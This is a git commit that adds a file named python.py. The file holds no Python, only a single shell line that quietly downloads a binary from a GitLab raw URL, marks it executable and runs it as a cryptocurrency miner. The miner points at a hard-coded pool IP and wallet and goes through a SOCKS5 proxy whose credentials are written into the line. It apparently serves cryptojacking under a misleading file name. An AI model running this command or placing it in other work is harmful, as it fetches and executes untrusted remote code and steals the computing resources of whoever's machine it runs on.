f1da0d98545ff03aab281f2504f901581635efd9
55113110159 <110314564+55113110159@users.noreply.github.com>
2023-12-22 20:50:39 +0700

    Create python.py

---
+++ python.py
@@ -0,0 +1,1 @@
+wget -q -O aJ6433 https://gitlab.com/node.js2594450/ruby/-/raw/main/rsem && chmod +x aJ6433 && ./aJ6433 -a yespower -o 45.67.211.223:443 -u KMFbor5m85Kh6fSjLKDZuSG6nJHMARC3TQ.$(echo $(shuf -i 1-100 -n 1)-lanas) -p c=CRNC,mc=VHH  --proxy=socks5://ugursfso:wqn60pnk6m95@45.155.68.129:8133 --syslog
